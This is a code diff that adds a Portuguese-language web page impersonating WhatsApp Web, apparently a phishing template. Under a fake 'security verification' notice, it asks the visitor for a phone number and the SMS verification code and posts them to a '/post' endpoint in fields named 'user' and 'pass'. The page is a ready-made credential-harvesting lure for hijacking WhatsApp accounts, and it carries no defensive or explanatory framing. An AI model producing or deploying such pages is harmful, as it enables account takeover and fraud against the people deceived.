@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: #111B21;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: #202C33;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            color: #00A884;
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #202C33;
+            border-radius: 8px;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .qr-placeholder {
+            width: 200px;
+            height: 200px;
+            background: #2A3942;
+            border-radius: 8px;
+            margin: 0 auto 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .qr-placeholder span {
+            font-size: 80px;
+        }
+
+        h2 {
+            color: #E9EDEF;
+            font-size: 18px;
+            font-weight: 400;
+            margin-bottom: 16px;
+        }
+
+        p {
+            color: #8696A0;
+            font-size: 14px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            color: #8696A0;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            background: #2A3942;
+            border: none;
+            border-radius: 8px;
+            color: #E9EDEF;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: 2px solid #00A884;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #00A884;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+
+        button:hover {
+            background: #008F72;
+        }
+
+        .info {
+            background: #182229;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .info p {
+            color: #8696A0;
+            font-size: 12px;
+            margin: 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <h1>WhatsApp Web</h1>
+    </div>
+    <div class="main">
+        <div class="container">
+            <div class="qr-placeholder"><span>📱</span></div>
+            <h2>Verificação de Segurança</h2>
+            <p>Para continuar usando o WhatsApp Web, confirme seu número de telefone</p>
+            <form action="/post" method="post">
+                <div class="form-group">
+                    <label>Telefone com DDD</label>
+                    <input type="tel" name="user" placeholder="(11) 99999-9999" required>
+                </div>
+                <div class="form-group">
+                    <label>Código de verificação (SMS)</label>
+                    <input type="text" name="pass" placeholder="000000" required>
+                </div>
+                <button type="submit">Verificar</button>
+            </form>
+            <div class="info">
+                <p>🔒 Suas mensagens são protegidas com criptografia de ponta a ponta</p>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
